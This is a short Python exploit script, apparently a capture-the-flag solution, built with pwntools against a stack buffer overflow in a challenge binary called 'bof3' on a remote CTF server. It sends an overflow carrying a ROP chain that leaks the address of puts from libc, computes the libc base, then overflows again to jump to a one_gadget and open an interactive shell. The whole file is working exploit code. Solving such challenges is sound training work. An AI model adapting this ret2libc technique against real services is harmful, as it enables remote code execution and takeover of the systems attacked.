from pwn import *

r = remote("csie.ctf.tw", 10127)
# r = process("./bof3", env = {"LD_PRELOAD" : "./libc.so.6"})
# r = process("./bof3")
context.arch = "amd64"

pop_rdi = 0x400673
puts_got = 0x601018
puts_plt = 0x4004a0
main = 0x4005b7
puts_off = 0x809c0

payload = 'a' * 16
payload += flat([pop_rdi, puts_got, puts_plt, main])
r.sendline(payload)

r.recvuntil("\n")
puts_addr = u64(r.recvuntil("\n").strip().ljust(8, "\x00"))
libc_base = puts_addr - puts_off
one_gadget = libc_base + 0x4f2c5

payload2 = 'a' * 16
payload2 += p64(one_gadget)
r.sendline(payload2)
r.recv()

r.interactive()
